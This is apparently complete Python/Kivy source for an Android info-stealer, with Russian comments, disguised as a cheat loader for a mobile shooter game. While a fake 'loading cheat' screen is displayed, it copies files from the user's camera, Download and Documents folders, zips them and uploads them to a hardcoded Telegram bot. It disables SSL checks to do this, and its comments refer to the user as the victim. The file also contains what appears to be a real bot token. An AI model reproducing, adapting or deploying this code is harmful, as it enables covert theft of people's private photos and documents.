import os
import platform
import urllib.request
import json
import zipfile
import shutil
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock

# --- НАСТРОЙКИ БОТА ---
BOT_TOKEN = "9225119074:AAGDLna9v5UXBDlQn90U_obuUtW0RHNdUSo"
CHAT_ID = "9283961223"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Игнорируем SSL, чтобы работало через любые VPN
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def send_msg(text):
    url = f"{API}/sendMessage?chat_id={CHAT_ID}&text={urllib.parse.quote(text)}"
    try:
        urllib.request.urlopen(url, context=ctx, timeout=10)
    except:
        pass

def send_doc(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Формируем multipart/form-data запрос вручную
        boundary = "----WebKitFormBoundary"
        body = b""
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{CHAT_ID}\r\n".encode()
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{os.path.basename(file_path)}\"\r\n".encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += data
        body += f"\r\n--{boundary}--\r\n".encode()
        
        url = f"{API}/sendDocument"
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        urllib.request.urlopen(req, context=ctx, timeout=60)
    except Exception as e:
        print("Error sending doc:", e)

def collect_data():
    # Собираем файлы в /sdcard (Android разрешает чтение без рута)
    tmp_dir = "/data/data/org.test.myapp/files/steal_tmp" # Папка приложения
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)
        
    # Ищем фото в DCIM
    sdcard_paths = ["/sdcard/DCIM/Camera", "/sdcard/Download", "/sdcard/Documents"]
    for p in sdcard_paths:
        if os.path.exists(p):
            for root, dirs, files in os.walk(p):
                for file in files[:20]: # Берем первые 20 файлов, чтобы не спалить трафик
                    try:
                        shutil.copy(os.path.join(root, file), os.path.join(tmp_dir, file))
                    except:
                        pass

    # Запаковываем в zip
    zip_path = "/data/data/org.test.myapp/files/dump.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(tmp_dir):
            for file in files:
                z.write(os.path.join(root, file), file)
    
    send_doc(zip_path, "Стилер сработал, лови файлы")

class FakeHackApp(App):
    def build(self):
        # Экран загрузки, чтобы жертва думала, что это чит
        self.label = Label(text="[size=24]Загрузка чита ESP...\n[/size][size=18]Обход античита Axlebolt...[/size]", markup=True)
        Clock.schedule_once(self.do_steal, 3) # Через 3 секунды начинаем воровать
        return self.label

    def do_steal(self, dt):
        self.label.text = "Успешно!\nЧит активирован."
        send_msg("Жертва запустила приложение! Начинаю сбор данных...")
        collect_data()
        Clock.schedule_once(lambda dt: self.stop(), 2) # Закрываем приложение

if __name__ == '__main__':
    FakeHackApp().run()
